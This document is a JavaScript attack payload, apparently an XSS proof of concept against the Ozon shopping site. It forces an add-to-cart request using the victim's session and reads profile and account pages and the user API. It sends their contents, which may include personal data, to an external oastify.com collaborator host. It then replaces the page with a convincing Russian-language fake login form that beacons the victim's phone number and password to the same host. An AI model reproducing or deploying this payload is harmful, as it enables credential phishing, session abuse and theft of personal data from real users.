alert('new_6');

var A = 'https://525hz9zc5mth4kmd2lkt04psdjja77vw.oastify.com';
var b = function(url, body) { navigator.sendBeacon(url, body || ''); };

b(A + '?v1_cart_sending');
fetch('https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart', {
    method: 'POST',
    headers: {'Content-Type': 'text/plain'},
    body: '[{"id":1215057882,"quantity":1}]',
    credentials: 'include',
    mode: 'no-cors'
}).then(function() {
    b(A + '?v1_cart_fired_ok');
}).catch(function(e) {
    b(A + '?v1_cart_err', e.message.substring(0, 100));
});

fetch('https://www.ozon.ru/api/composer-api.bx/_action/getUserV2', {
    method: 'POST',
    headers: {'Content-Type': 'text/plain'},
    body: '{}',
    credentials: 'include'
}).then(function(r) {
    b(A + '?v2_user_cors_ok&st=' + r.status);
    return r.text();
}).then(function(t) {
    b(A + '/v2_user_pii', t.substring(0, 4000));
}).catch(function(e) {
    b(A + '?v2_user_cors_blocked');
    fetch('https://www.ozon.ru/api/composer-api.bx/_action/getUserV2', {
        method: 'POST',
        headers: {'Content-Type': 'text/plain'},
        body: '{}',
        credentials: 'include',
        mode: 'no-cors'
    }).then(function() { b(A + '?v2_user_nocors_fired'); });
});

fetch('https://www.ozon.ru/mini-app-manifest', {
    method: 'GET',
    credentials: 'include'
}).then(function(r) {
    b(A + '?v3_manifest_st=' + r.status + '&cors_ok=1');
    return r.text();
}).then(function(t) {
    b(A + '/v3_manifest_body', t.substring(0, 4000));
}).catch(function(e) {
    b(A + '?v3_manifest_err', e.message.substring(0, 100));
});

var cachedProfilePages = [
    'https://www.ozon.ru/my/main',
    'https://www.ozon.ru/my/account'
];
cachedProfilePages.forEach(function(url, i) {
    fetch(url, {method: 'GET', credentials: 'include'})
    .then(function(r) {
        b(A + '?v3_page' + i + '_st=' + r.status);
        return r.text();
    })
    .then(function(t) {
        var hasPii = /ozon_user|userId|firstName|phone|email/.test(t);
        b(A + '?v3_page' + i + '_pii=' + hasPii + '&len=' + t.length);
        if (t.length > 100) b(A + '/v3_page' + i, t.substring(0, 3000));
    })
    .catch(function(e) {
        b(A + '?v3_page' + i + '_err', e.message.substring(0, 50));
    });
});

setTimeout(function() {
    b(A + '?v5_phish_rendering');
    var att = A;

    var html = '<!DOCTYPE html><html><head>'
        + '<meta charset="utf-8">'
        + '<meta name="viewport" content="width=device-width,initial-scale=1">'
        + '<title>Ozon</title>'
        + '<style>'
        + '*{box-sizing:border-box;margin:0;padding:0}'
        + 'body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f7fa;min-height:100vh}'
        + '.topbar{height:3px;background:linear-gradient(90deg,#005bff,#00b3ff)}'
        + '.header{background:#fff;padding:14px 18px;border-bottom:1px solid #eaedf2;display:flex;align-items:center}'
        + '.logo{font-size:24px;font-weight:900;color:#005bff;letter-spacing:-1px}'
        + '.card{background:#fff;margin:16px;border-radius:14px;padding:22px;box-shadow:0 2px 12px rgba(0,0,0,.07)}'
        + '.title{font-size:19px;font-weight:700;color:#0e1624;margin-bottom:8px}'
        + '.sub{font-size:14px;color:#8a92a3;line-height:1.5;margin-bottom:22px}'
        + '.field{margin-bottom:15px}'
        + 'label{display:block;font-size:13px;color:#6b7789;font-weight:500;margin-bottom:6px}'
        + 'input{width:100%;padding:13px 15px;border:1.5px solid #e2e6ed;border-radius:10px;font-size:16px;color:#0e1624;background:#fafbfc}'
        + 'input:focus{border-color:#005bff;background:#fff;outline:none}'
        + '.btn{background:#005bff;color:#fff;width:100%;padding:15px;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-top:4px}'
        + '.hint{text-align:center;font-size:12px;color:#b0b8c4;margin-top:14px}'
        + '.icon{display:inline-block;width:12px;height:12px;margin-right:4px;vertical-align:middle}'
        + '</style></head><body>'
        + '<div class="topbar"></div>'
        + '<div class="header"><span class="logo">ozon</span></div>'
        + '<div class="card">'
        + '<div class="title">Подтвердите личность</div>'
        + '<div class="sub">В целях безопасности аккаунта требуется повторный вход. Это стандартная процедура.</div>'
        + '<div class="field">'
        + '<label>Номер телефона</label>'
        + '<input id="ph" type="tel" placeholder="+7 (___) ___-__-__" autocomplete="tel">'
        + '</div>'
        + '<div class="field">'
        + '<label>Пароль</label>'
        + '<input id="pw" type="password" placeholder="Пароль от Ozon ID">'
        + '</div>'
        + '<button class="btn" id="btn" onclick="go()">Войти в аккаунт</button>'
        + '<div class="hint">&#128274; Ваши данные надёжно защищены</div>'
        + '</div>'
        + '<script>'
        + 'var A="' + att + '";'
        + 'function go(){'
        + 'var ph=document.getElementById("ph").value||"(empty)";'
        + 'var pw=document.getElementById("pw").value||"(empty)";'
        + 'navigator.sendBeacon(A+"/v5_creds","ph="+encodeURIComponent(ph)+"|pw="+encodeURIComponent(pw));'
        + 'var btn=document.getElementById("btn");'
        + 'btn.textContent="Проверяем...";'
        + 'btn.disabled=true;'
        + 'btn.style.background="#ccc";'
        + '}'
        + '<\/script></body></html>';

    document.open();
    document.write(html);
    document.close();
}, 2500);
